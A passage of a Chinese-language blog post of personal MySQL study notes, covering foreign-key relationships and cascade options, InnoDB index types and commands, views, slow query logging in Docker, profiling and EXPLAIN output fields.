(CardID, EmpID, IssueDate)<br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;2025-04-09&#x27;</span>);<br></code></pre></td></tr></table></figure><hr><h5 id="7-3-3-一对多"><a href="#7-3-3-一对多" class="headerlink" title="7.3.3. 一对多"></a>7.3.3. 一对多</h5><p>在一对多关系中，一个表中的一行记录可以与另一个表中的多行记录相关联。常见的例子是：一个部门有多个员工（多），而每个员工只能属于一个部门（一）。</p><p>在一对多关系总，选择 <strong>“一”的表作为主表</strong>，<strong>“多”的表作为从表</strong></p><p>假设有 <code>Department</code>（部门表）和 <code>Employee</code>（员工表）。一个部门有多个员工，每个员工属于一个部门。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> Department 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Department (<br>    DeptID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    DeptName <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">2.</span> Employee 表（从表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Employee (<br>    EmpID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    <span class="hljs-type">Name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),<br>    DeptID <span class="hljs-type">INT</span>,<br>    <span class="hljs-keyword">FOREIGN KEY</span> (DeptID) <span class="hljs-keyword">REFERENCES</span> Department(DeptID)<br>);<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521212132677.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521212154361.png"></p><blockquote><p>[!NOTE] 注意事项：</p><ol><li>删除数据时，先删除从表数据，再删除主表数据</li><li>插入数据时，先插入主表数据，再插入从表</li></ol></blockquote><hr><h5 id="7-3-4-多对多"><a href="#7-3-4-多对多" class="headerlink" title="7.3.4. 多对多"></a>7.3.4. 多对多</h5><p>在多对多关系中，表中的多行记录与另一个表中的多行记录相互关联。常见的例子是：一个学生可以选修多门课程（多），每门课程也可以有多个学生选修（多）。</p><p>在多对多关系中，我们通常需要 <strong>一个中间表</strong> 来存储关联信息。<strong>在这个中间表中</strong>，我们为每一对关联的表<strong>添加外键</strong>。</p><p>假设有 <code>Student</code>（学生表）和 <code>Course</code>（课程表），一个学生可以选修多门课程，而每门课程可以有多个学生选修。我们需要一个中间表 <code>Enrollment</code> 来记录学生与课程之间的关系。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> Student 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Student (<br>    StudentID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    <span class="hljs-type">Name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">2.</span> Course 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Course (<br>    CourseID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    CourseName <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">3.</span> Enrollment 表（从表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Enrollment (<br>    StudentID <span class="hljs-type">INT</span>,<br>    CourseID <span class="hljs-type">INT</span>,<br>    <span class="hljs-keyword">PRIMARY KEY</span> (StudentID, CourseID),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (StudentID) <span class="hljs-keyword">REFERENCES</span> Student(StudentID),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (CourseID) <span class="hljs-keyword">REFERENCES</span> Course(CourseID)<br>);<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>据库设计推荐在这种“纯粹中间表”里省略 id 字段，因为我们PRIMARY KEY (StudentID, CourseID),作为<strong>联合主键</strong>，这已经能唯一标识每一行数据了。</li><li>删除数据时，先删除从表数据，再删除主表数据（先删除中间表数据）</li><li>插入数据时，先插入主表数据，再插入从表（先左再右后中间）</li><li>需要插三次，先左再右后中间</li></ol></blockquote><hr><h5 id="7-3-5-外键约束下的删除与更新行为"><a href="#7-3-5-外键约束下的删除与更新行为" class="headerlink" title="7.3.5. 外键约束下的删除与更新行为"></a>7.3.5. 外键约束下的删除与更新行为</h5><table><thead><tr><th><strong>行为</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>CASCADE</strong></td><td>如果主表中的数据被删除或更新，外键表中的相关数据会被自动删除或更新。</td></tr><tr><td><strong>SET NULL</strong></td><td>如果主表中的数据被删除或更新，外键表中相关数据的外键列会被设置为 <code>NULL</code>。</td></tr><tr><td><strong>NO ACTION</strong></td><td>如果主表中的数据被删除或更新，外键约束会阻止该操作发生。如果外键表中存在与主表相关的数据，则不能执行删除或更新操作。</td></tr><tr><td><strong>RESTRICT</strong></td><td>与 <code>NO ACTION</code> 类似，阻止删除或更新操作。如果外键表中有相关数据，删除或更新会被拒绝。</td></tr><tr><td><strong>SET DEFAULT</strong></td><td>如果主表中的数据被删除或更新，外键表中的相关外键列会被设置为该列的默认值（需要列定义默认值）。</td></tr></tbody></table><hr><h3 id="8-MySQL-索引"><a href="#8-MySQL-索引" class="headerlink" title="8. MySQL 索引"></a>8. MySQL 索引</h3><h4 id="8-1-索引存储形式"><a href="#8-1-索引存储形式" class="headerlink" title="8.1. 索引存储形式"></a>8.1. 索引存储形式</h4><p>在 <code>InnoDB</code> 存储引擎中，根据索引的存储形式，可以分为聚集索引和二级索引：</p><ol><li>&#x3D;&#x3D;聚集索引&#x3D;&#x3D;：<br> 1.一个表中<strong>只能有且必须有一个</strong>聚集索引。<ol><li>聚集索引将数据和索引存储在一起，索引结构的叶子节点直接保存行数据</li><li>聚集索引的选取规则：<ol><li>如果存在<strong>主键索引</strong>，主键索引即为聚集索引</li><li>如果没有主键索引，第一个<strong>唯一索引</strong>会作为聚集索引</li><li>如果既没有主键也没有唯一索引，<code>InnoDB</code> 会自动为表生成一个<strong>隐藏</strong>的 <code>rowid</code> 作为聚集索引</li></ol></li></ol></li><li>&#x3D;&#x3D;二级索引&#x3D;&#x3D;：<ol><li>一个表中可以存在多个二级索引</li><li>二级索引将数据和索引分开存储，索引结构的叶子节点存储的是对应主键的值。</li><li>在 <code>InnoDB</code> 存储引擎中，当你查询二级索引列的数据时，过程如下：<ol><li>查询会首先通过二级索引查找该列的值，并返回二级索引中的存储的主键值</li><li>得到主键值后，查询会使用主键值回到聚集索引中查找实际的数据行。</li></ol></li></ol></li></ol><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250409183911323.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250409192001892.png"></p><hr><h4 id="8-2-索引的分类"><a href="#8-2-索引的分类" class="headerlink" title="8.2. 索引的分类"></a>8.2. 索引的分类</h4><table><thead><tr><th><strong>索引类型</strong></th><th><strong>关键字</strong></th><th><strong>描述</strong></th><th><strong>应用场景</strong></th></tr></thead><tbody><tr><td><strong>主键索引</strong></td><td><code>PRIMARY KEY</code></td><td>每个表只能有一个主键索引，主键列不允许有 NULL 值。</td><td>用于唯一标识表中的每一行，通常是表的主键（例如，<code>id</code> 列）。</td></tr><tr><td><strong>唯一索引</strong></td><td><code>UNIQUE</code></td><td>保证索引列的值是唯一的，但可以有 NULL 值。</td><td>用于确保数据的唯一性，适用于需要保持唯一性的字段（如邮箱地址、用户名等）。</td></tr><tr><td><strong>普通索引</strong></td><td><code>INDEX</code> 或 <code>KEY</code></td><td>普通索引是最基本的索引类型，不保证值唯一。</td><td>用于提高查询速度，适用于不要求唯一性但需要快速查找的字段。</td></tr><tr><td><strong>全文索引</strong></td><td><code>FULLTEXT</code></td><td>用于全文搜索，通常在 <code>TEXT</code> 类型的列上使用，支持单词的查找。</td><td>用于执行全文搜索，如在文章或评论内容中查找关键词。（直接上手 ElasticSearch）</td></tr><tr><td><strong>复合索引</strong></td><td><code>INDEX</code> 或 <code>KEY</code></td><td>由多个列组成的索引。</td><td>当查询涉及多个字段时，可以使用复合索引来提高查询性能，避免多个单列索引的使用。</td></tr></tbody></table><blockquote><p>[!NOTE] 注意事项</p><ol><li>一列可以同时有多个不同类型的索引（例如普通索引 + 唯一索引 + 全文索引），但不能有多个相同类型的索引（如两个唯一索引）。</li></ol></blockquote><hr><h4 id="8-3-索引相关命令"><a href="#8-3-索引相关命令" class="headerlink" title="8.3. 索引相关命令"></a>8.3. 索引相关命令</h4><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># 1. 添加索引</span><br><span class="hljs-comment"># 1.1. 主键索引</span><br>通过创建主键约束来自动生成主键索引。<br><br><span class="hljs-comment"># 1.2. 唯一索引</span><br>create unique index <span class="hljs-variable">&lt;index-name&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;table-name&gt;</span> (<span class="hljs-variable">&lt;column-name&gt;</span>);<br><br><span class="hljs-comment"># 1.3. 普通索引</span><br>create index <span class="hljs-variable">&lt;index-name&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;table-name&gt;</span> (<span class="hljs-variable">&lt;column-name&gt;</span>);<br><br><span class="hljs-comment"># 1.4. 全文索引</span><br>create fulltext index <span class="hljs-variable">&lt;index-name&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;table-name&gt;</span> (<span class="hljs-variable">&lt;column-name&gt;</span>);<br><br><span class="hljs-comment"># 1.5. 复合索引</span><br>create index <span class="hljs-variable">&lt;index-name&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;table-name&gt;</span> (<span class="hljs-variable">&lt;column1&gt;</span>, <span class="hljs-variable">&lt;column2&gt;</span>, ...);<br><br><br><span class="hljs-comment"># 2. 删除索引</span><br><span class="hljs-keyword">drop</span> index <span class="hljs-variable">&lt;index-name&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;table-name&gt;</span>;<br><br><br><span class="hljs-comment"># 3. 查询索引</span><br>show index <span class="hljs-keyword">from</span> <span class="hljs-variable">&lt;table-name&gt;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><code>&lt;index-name&gt;</code> 是为索引自定义的名称，主要用于后续的维护、查看和删除操作</li><li>唯一索引和唯一约束效果相同，只是语义上的差异：<ul><li><font color="#00b0f0">唯一索引</font>：<ul><li>更偏向结构设计的“规范性”</li></ul></li><li><font color="#00b0f0">唯一约束</font>：<ul><li>更偏向数据库“性能调优”的语义表达</li></ul></li></ul></li></ol></blockquote><hr><h3 id="9-MySQL-视图"><a href="#9-MySQL-视图" class="headerlink" title="9. MySQL 视图"></a>9. MySQL 视图</h3><h4 id="9-1-视图概述"><a href="#9-1-视图概述" class="headerlink" title="9.1. 视图概述"></a>9.1. 视图概述</h4><p>视图是一个虚拟的表，它<strong>内部定义了 SQL 查询语句</strong>，每次你查询视图时，数据库会执行视图中的查询，并动态生成结果，你可以理解为，视图是将一个 SQL 查询的结果作为一个虚拟表进行保存。视图允许用户在不直接访问底层表的情况下，通过查询视图来获取数据。</p><p>简单来说，视图充当了数据的抽象层，提供了一个接口，使得客户端可以直接查询视图，而无需关心底层表的结构。可以将查询路径理解为：客户端 -&gt; 视图 -&gt; 表。使用视图的好处有很多：</p><ol><li>&#x3D;&#x3D;提高数据安全&#x3D;&#x3D;：<ol><li>视图可以限制客户端对某些敏感数据的访问。例如，如果你有一个包含用户个人信息的表，你可以创建一个不包含敏感信息（如密码、身份证号等）的视图，来对外提供查询。</li><li>作为客户端开发者，你自然不需要限制自己的访问权限，但如果需要简化查询逻辑，视图仍然是一个方便的工具</li><li>但是在多用户环境下，你可以通过视图限制用户仅访问他们有权限查看的数据，确保敏感信息的安全</li></ol></li><li>&#x3D;&#x3D;简化查询逻辑&#x3D;&#x3D;：<ol><li>假设有一个复杂的查询，涉及多个表、连接、筛选和排序操作。你可以将这些操作封装成一个视图，之后只需查询视图，避免每次都编写复杂的 SQL 查询。<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 复杂的查询逻辑<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">VIEW</span> employee_summary <span class="hljs-keyword">AS</span><br><span class="hljs-keyword">SELECT</span> emp.id, emp.name, dep.name <span class="hljs-keyword">AS</span> department, COUNT(proj.id) <span class="hljs-keyword">AS</span> project_count<br><span class="hljs-keyword">FROM</span> employees emp<br><span class="hljs-keyword">JOIN</span> departments dep <span class="hljs-keyword">ON</span> emp.department_id = dep.id<br><span class="hljs-keyword">LEFT JOIN</span> projects proj <span class="hljs-keyword">ON</span> emp.id = proj.employee_id<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> emp.id;<br><br><br># <span class="hljs-number">2.</span> 直接查询视图<br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> employee_summary <span class="hljs-keyword">WHERE</span> department = <span class="hljs-string">&#x27;IT&#x27;</span>;<br></code></pre></td></tr></table></figure></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>在某些特定情况下，<strong>视图可以进行更新</strong>（即可以通过视图执行 <code>INSERT</code>、<code>UPDATE</code> 或 <code>DELETE</code> 操作），但通常情况下，视图<strong>主要用于查询</strong>，<strong>不建议用于数据更新操作</strong></li></ol></blockquote><hr><h4 id="9-2-视图相关命令"><a href="#9-2-视图相关命令" class="headerlink" title="9.2. 视图相关命令"></a>9.2. 视图相关命令</h4><p>如果需要修改视图的定义，可以使用 <code>CREATE OR REPLACE VIEW</code> 来替换已有的视图。注意，<code>REPLACE</code> 会删除旧视图并创建新的视图。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql"># <span class="hljs-number">1.</span> 创建视图<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">view</span> [if <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span>] <span class="hljs-operator">&lt;</span><span class="hljs-keyword">view</span><span class="hljs-operator">-</span>name<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span>column1<span class="hljs-operator">&gt;</span>, <span class="hljs-operator">&lt;</span>column2<span class="hljs-operator">&gt;</span>, ... <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span><span class="hljs-operator">-</span>name<span class="hljs-operator">&gt;</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">where</span> <span class="hljs-keyword">condition</span><span class="hljs-operator">&gt;</span>;<br><br><br># <span class="hljs-number">2.</span> 删除视图<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">view</span> [if <span class="hljs-keyword">exists</span>] <span class="hljs-operator">&lt;</span><span class="hljs-keyword">view</span><span class="hljs-operator">-</span>name<span class="hljs-operator">&gt;</span>;<br><br><br># <span class="hljs-number">3.</span> 更新视图（相当于重新写了一个视图，会删除旧视图，新建新视图）<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">or</span> replace <span class="hljs-keyword">view</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">view</span><span class="hljs-operator">-</span>name<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span>column1<span class="hljs-operator">&gt;</span>,<span class="hljs-operator">&lt;</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span>column2<span class="hljs-operator">&gt;</span>, ... <span class="hljs-keyword">from</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">table</span><span class="hljs-operator">-</span>name<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">where</span> <span class="hljs-operator">&lt;</span>your<span class="hljs-operator">-</span><span class="hljs-keyword">new</span><span class="hljs-operator">-</span>ondition<span class="hljs-operator">&gt;</span>;<br><br><br># <span class="hljs-number">4.</span> 查询视图（正常怎么查询，这里怎么查询）<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> view_name;<br></code></pre></td></tr></table></figure><hr><h3 id="10-MySQL-锁"><a href="#10-MySQL-锁" class="headerlink" title="10. MySQL 锁"></a>10. MySQL 锁</h3><hr><h3 id="11-MySQL-调优"><a href="#11-MySQL-调优" class="headerlink" title="11. MySQL 调优"></a>11. MySQL 调优</h3><h4 id="11-1-SQL-执行频率"><a href="#11-1-SQL-执行频率" class="headerlink" title="11.1. SQL 执行频率"></a>11.1. SQL 执行频率</h4><p>通过分析 SQL 执行的比例，我们可以判断数据库或表的主要操作类型是查询（SELECT）还是增删改（INSERT、UPDATE、DELETE）。如果主要是查询操作，我们可以重点进行索引优化，以提升查询性能。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 查看全局数据<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> status <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;com%&#x27;</span>;<br><br><br># <span class="hljs-number">2.</span> 查看当前会话数据<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">session</span> status <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;com%&#x27;</span>;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>给出的 <code>value</code> 是次数，<code>value</code> 多大就代表有多少次</li></ol></blockquote><hr><h4 id="11-2-慢查询日志"><a href="#11-2-慢查询日志" class="headerlink" title="11.2. 慢查询日志"></a>11.2. 慢查询日志</h4><p>慢日志记录了所有执行时间超过指定参数（<code>long_query_time</code>，单位：秒，默认10秒）的所有SQL语句的日志。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1. 查看慢日志是否开启</span><br>show variables like <span class="hljs-string">&#x27;slow_query_log&#x27;</span>;<br><br><br><span class="hljs-comment"># 2. 开启慢日志</span><br><span class="hljs-comment"># 2.1. 编辑配置文件</span><br>vim <span class="hljs-regexp">/data/my</span>sql<span class="hljs-regexp">/etc/my</span>sql<span class="hljs-regexp">/conf.d/my</span>.cnf                       <span class="hljs-comment"># 卷挂载</span><br><br><span class="hljs-comment"># 2.2. 添加以下内容</span><br>[mysqld]                                                      <span class="hljs-comment"># mysql 区块</span><br>slow_query_log = <span class="hljs-number">1</span>                                            <span class="hljs-comment"># 开启慢日志</span><br>long_query_time = <span class="hljs-number">0.2</span>                                         <span class="hljs-comment"># 设置慢日志的阈值（单位：秒）</span><br>slow_query_log_file = <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/mysql/my</span>sql-slow.log           <span class="hljs-comment"># 设置慢日志的保存路径</span><br>log_queries_not_using_indexes = <span class="hljs-number">1</span>                             <span class="hljs-comment"># 把所有没有使用索引的 SQL 查询也记录到慢查询日志中，即使它们没超过 long_query_time 阈值</span><br><br><br><span class="hljs-comment"># 3. 重启容器</span><br>docker restart &lt;container-name&gt; / &lt;container-id&gt;<br><br><br><span class="hljs-comment"># 4. 查询慢日志</span><br>cat <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mysql/</span>localhost-slow.log<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>只要你是在 <code>conf.d</code>、<code>mysql.conf.d</code>、或者自定义的 <code>.cnf</code> 文件里配置，请务必写上 <code>[mysqld]</code></li><li>开启慢查询日志后，当你执行 SQL 语句时，如果查询执行时间超过设定的阈值，MySQL 会自动记录该查询为慢查询，并且会立即提醒：</li></ol></blockquote><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250409223121020.png"></p><hr><h4 id="11-3-Profile-查看详情"><a href="#11-3-Profile-查看详情" class="headerlink" title="11.3. Profile 查看详情"></a>11.3. Profile 查看详情</h4><p>Profiles 可以帮助我们分析时间的分配，明确哪些环节消耗了最多的时间。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 1. 查看 MySQL 是否支持 Profile</span><br>select @@have_profiling;<br><br><br><span class="hljs-comment"># 2. 开启 Profile</span><br><span class="hljs-keyword">set</span> profiling = <span class="hljs-number">1</span>;<br><br><br><span class="hljs-comment"># 3. 执行一系列 SQL 语句</span><br>select * <span class="hljs-keyword">from</span> <span class="hljs-built_in">characters</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>;<br>select * <span class="hljs-keyword">from</span> <span class="hljs-built_in">characters</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>;<br>select * <span class="hljs-keyword">from</span> <span class="hljs-built_in">characters</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-number">3</span>;<br><br><br><span class="hljs-comment"># 4. 查看 SQL 语句耗时时间</span><br>show profiles;<br><br><br><span class="hljs-comment"># 5. 根据 query-id 查看 SQL 语句每个阶段的耗时情况</span><br>show profile <span class="hljs-keyword">for</span> query &lt;query-<span class="hljs-built_in">id</span>&gt;;<br><br><br><span class="hljs-comment"># 6. 根据 query-id 查看 SQL 语句 CPU 使用情况</span><br>show profile cpu <span class="hljs-keyword">for</span> query &lt;query-<span class="hljs-built_in">id</span>&gt;;<br></code></pre></td></tr></table></figure><hr><h4 id="11-4-Explain"><a href="#11-4-Explain" class="headerlink" title="11.4. Explain"></a>11.4. Explain</h4><p><code>explain</code> 命令用于获取 mysql 执行 <code>select</code> 语句的执行计划信息，包括表如何连接、连接顺序等细节。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">explain</span> &lt;<span class="hljs-keyword">select</span> 语句&gt;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410100653127.png"></p><ol><li>&#x3D;&#x3D;id&#x3D;&#x3D;:<ol><li>查询的 <strong>标识符</strong>，它表示在多表查询中每个操作的执行顺序。例如，<code>id = 1</code> 是最先执行的操作，<code>id = 2</code> 是第二个执行的操作，依此类推。</li><li>在单表查询中，<code>id</code> 始终为 <code>1</code>。</li><li>在多表查询中，<code>id</code> 会被分配一个递增的数字，用来标识查询的执行顺序。</li></ol></li><li>&#x3D;&#x3D;select_type&#x3D;&#x3D;：<ol><li>查询的类型</li><li><font color="#00b0f0">SIMPLE</font>：<ol><li>简单的查询，没有使用子查询或联合查询。</li></ol></li><li><font color="#00b0f0">PRIMAR</font>：<ol><li>表示主查询（最外层查询），如果查询中有子查询，主查询会标记为 <code>PRIMARY</code>。</li></ol></li><li><font color="#00b0f0">SUBQUER</font>：<ol><li>表示子查询。</li></ol></li><li><font color="#00b0f0">DEPENDENT SUBQUER</font>：<ol><li>依赖于外部查询的子查询。</li></ol></li><li><font color="#00b0f0">UNION</font>：<ol><li>表示 <code>UNION</code> 查询中的第二个查询。</li></ol></li></ol></li><li>&#x3D;&#x3D;table&#x3D;&#x3D;：<ol><li>查询的 <strong>表</strong>，表示该行对应的操作是针对哪张表进行的。</li></ol></li><li>&#x3D;&#x3D;partitions&#x3D;&#x3D;：<ol><li>查询操作作用的 <strong>分区</strong>。</li><li>在使用分区表时，表示该查询在哪些分区上执行。</li><li>没有分区的表，这一列会显示为 <code>NULL</code>。</li></ol></li><li>&#x3D;&#x3D;type&#x3D;&#x3D;：<ol><li>连接类型，表示 MySQL 查询优化器选择的访问方式。一下是性能由差到好的顺序：</li><li><font color="#00b0f0">all</font>：<ol><li>全表扫描，表示 MySQL 会扫描表中的所有记录，效率较低。</li></ol></li><li><font color="#00b0f0">index</font>：<ol><li>索引扫描，表示 MySQL 会扫描整个索引而不是整个表。</li></ol></li><li><font color="#00b0f0">range</font>：<ol><li>范围扫描，表示 MySQL 会使用索引查找某个范围的记录。</li></ol></li><li><font color="#00b0f0">ref</font>：<ol><li>基于非唯一索引的扫描。</li></ol></li><li><font color="#00b0f0">eq_ref</font>：<ol><li>基于唯一索引的扫描，每个记录都能对应唯一的索引值。</li></ol></li><li><font color="#00b0f0">const</font>：<ol><li>常量查找，表示表中的每一行记录都可以通过常量来匹配，效率非常高。</li></ol></li><li><font color="#00b0f0">system</font>：<ol><li>表示系统表，通常表示只有一行数据的表（如数据库的 <code>information_schema</code> 表）。</li></ol></li></ol></li><li>&#x3D;&#x3D;possible_keys&#x3D;&#x3D;：<ol><li>本次查询可能使用到的索引，如果没有使用索引，则为 null</li></ol></li><li>&#x3D;&#x3D;key&#x3D;&#x3D;：<ol><li>实际使用的 <strong>索引</strong>，表示查询中实际使用的索引。</li><li>如果该字段显示为 <code>NULL</code>，表示没有使用索引，可能进行了全表扫描</li><li>如果显示了索引名，表示优化器选择了这个索引来执行查询</li></ol></li><li>&#x3D;&#x3D;key_len&#x3D;&#x3D;：<ol><li>表示优化器使用的索引的 <strong>长度</strong>（单位：字节）。该值通常与索引列的类型和数量相关。</li><li>在不损失精确性的前提下， 长度越短越好 。</li></ol></li><li>&#x3D;&#x3D;ref&#x3D;&#x3D;：<ol><li><strong>索引列的比较值</strong>，显示该查询使用了哪个字段（或常量）来与索引中的值进行比较。</li></ol></li><li>&#x3D;&#x3D;rows&#x3D;&#x3D;：<ol><li>估计 <strong>需要扫描的行数</strong>，表示查询执行时，优化器估算的需要扫描的表中记录的数量。</li></ol></li><li>&#x3D;&#x3D;filtered&#x3D;&#x3D;：<ol><li>表示返回结果的行数占需读取行数的百分比， filtered 的值越大越好。</li></ol></li><li>&#x3D;&#x3D;Extra&#x3D;&#x3D;：<ol><li>提供有关查询执行的额外信息</li></ol></li></ol><h1 id="二、实操（搭建-MySQL）"><a 